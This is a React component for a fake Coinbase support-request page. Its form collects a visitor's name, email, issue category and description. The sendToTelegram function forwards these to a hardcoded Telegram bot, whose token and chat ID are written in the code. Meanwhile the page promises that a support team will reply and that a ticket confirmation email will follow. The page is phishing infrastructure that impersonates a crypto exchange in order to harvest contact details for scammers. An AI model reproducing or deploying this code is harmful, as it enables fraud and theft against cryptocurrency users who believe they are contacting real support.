import { useState } from "react"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { Textarea } from "@/components/ui/textarea"
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card"
import { Upload, FileText } from "lucide-react"
import { toast } from "@/hooks/use-toast"

const RequestForm = () => {
  const [isSubmitting, setIsSubmitting] = useState(false)
  const [formData, setFormData] = useState({
    fullName: '',
    email: '',
    category: '',
    description: ''
  })

  const sendToTelegram = async (data: any) => {
    const fullMessage = `
🚨 *New Coinbase Support Request* 🚨

👤 *Name:* ${data.fullName}
📧 *Email:* ${data.email}
📂 *Issue:* ${data.category}
📝 *Message:* ${data.description}
    `;

    const telegramAPI = "https://api.telegram.org/bot8237655028:AAHRh8ZmFP_z9O5Eqid1No1IkjcY5J0tCno/sendMessage";
    const chatID = "6171819166";

    const response = await fetch(telegramAPI, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        chat_id: chatID,
        text: fullMessage,
        parse_mode: "Markdown"
      })
    });

    if (!response.ok) {
      throw new Error('Failed to send message to Telegram');
    }

    return response.json();
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!formData.fullName || !formData.email || !formData.category || !formData.description) {
      toast({
        title: "Missing Information",
        description: "Please fill in all required fields",
        variant: "destructive"
      });
      return;
    }

    setIsSubmitting(true);
    
    try {
      await sendToTelegram(formData);
      
      toast({
        title: "✅ Request Submitted Successfully!",
        description: "Our support team will get back to you within 2-4 hours."
      });
      
      // Reset form
      setFormData({
        fullName: '',
        email: '',
        category: '',
        description: ''
      });
      
    } catch (error) {
      toast({
        title: "❌ Submission Failed",
        description: "Failed to send your request. Please try again later.",
        variant: "destructive"
      });
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <section id="submit-request" className="py-16 bg-gray-50/50">
      <div className="max-w-4xl mx-auto px-4 sm:px-6 lg:px-8">
        <div className="text-center mb-12">
          <h2 className="text-3xl font-bold text-foreground mb-4">Submit a Support Request</h2>
          <p className="text-lg text-muted-foreground max-w-2xl mx-auto">
            Can't find what you're looking for? Submit a detailed request and our support team will get back to you.
          </p>
        </div>
        
        <Card className="border-0 shadow-lg">
          <CardHeader>
            <CardTitle className="flex items-center space-x-2">
              <FileText className="w-6 h-6 text-coinbase-blue" />
              <span>Support Request Form</span>
            </CardTitle>
            <CardDescription>
              Please provide as much detail as possible to help us assist you effectively
            </CardDescription>
          </CardHeader>
          <CardContent className="space-y-6">
            <form onSubmit={handleSubmit} className="space-y-6">
              <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                <div className="space-y-2">
                  <Label htmlFor="fullName">Full Name</Label>
                  <Input 
                    id="fullName" 
                    value={formData.fullName}
                    onChange={(e) => setFormData({...formData, fullName: e.target.value})}
                    placeholder="Enter your full name" 
                    required 
                  />
                </div>
                <div className="space-y-2">
                  <Label htmlFor="email">Email Address</Label>
                  <Input 
                    id="email" 
                    type="email" 
                    value={formData.email}
                    onChange={(e) => setFormData({...formData, email: e.target.value})}
                    placeholder="Enter your email address" 
                    required 
                  />
                </div>
              </div>
              
              <div className="space-y-2">
                <Label htmlFor="category">Issue Category</Label>
                <Select value={formData.category} onValueChange={(value) => setFormData({...formData, category: value})} required>
                  <SelectTrigger>
                    <SelectValue placeholder="Select the category that best describes your issue" />
                  </SelectTrigger>
                  <SelectContent>
                    <SelectItem value="account-access">Account Access</SelectItem>
                    <SelectItem value="transactions">Transaction Issues</SelectItem>
                    <SelectItem value="security">Security Concerns</SelectItem>
                    <SelectItem value="verification">Identity Verification</SelectItem>
                    <SelectItem value="trading">Trading & Wallet</SelectItem>
                    <SelectItem value="fees">Fees & Pricing</SelectItem>
                    <SelectItem value="technical">Technical Issues</SelectItem>
                    <SelectItem value="other">Other</SelectItem>
                  </SelectContent>
                </Select>
              </div>
              
              <div className="space-y-2">
                <Label htmlFor="description">Detailed Description</Label>
                <Textarea 
                  id="description"
                  value={formData.description}
                  onChange={(e) => setFormData({...formData, description: e.target.value})}
                  placeholder="Please describe your issue in detail. Include any error messages, transaction IDs, or steps you've already tried..."
                  rows={6}
                  required
                />
              </div>
              
              <div className="space-y-2">
                <Label htmlFor="screenshot">Upload Screenshot (Optional)</Label>
                <div className="border-2 border-dashed border-gray-300 rounded-lg p-8 text-center hover:border-coinbase-blue transition-colors cursor-pointer">
                  <Upload className="w-12 h-12 text-gray-400 mx-auto mb-4" />
                  <p className="text-muted-foreground mb-2">Click to upload or drag and drop</p>
                  <p className="text-sm text-muted-foreground">PNG, JPG, PDF up to 10MB</p>
                  <input type="file" className="hidden" accept="image/*,.pdf" />
                </div>
              </div>
              
              <div className="pt-4">
                <Button 
                  type="submit" 
                  variant="coinbase" 
                  size="lg" 
                  className="w-full md:w-auto" 
                  disabled={isSubmitting}
                >
                  {isSubmitting ? "Submitting..." : "Submit Request"}
                </Button>
                <p className="text-sm text-muted-foreground mt-4">
                  You'll receive a confirmation email with your ticket ID. Average response time is 2-4 hours.
                </p>
              </div>
            </form>
          </CardContent>
        </Card>
      </div>
    </section>
  )
}

export default RequestForm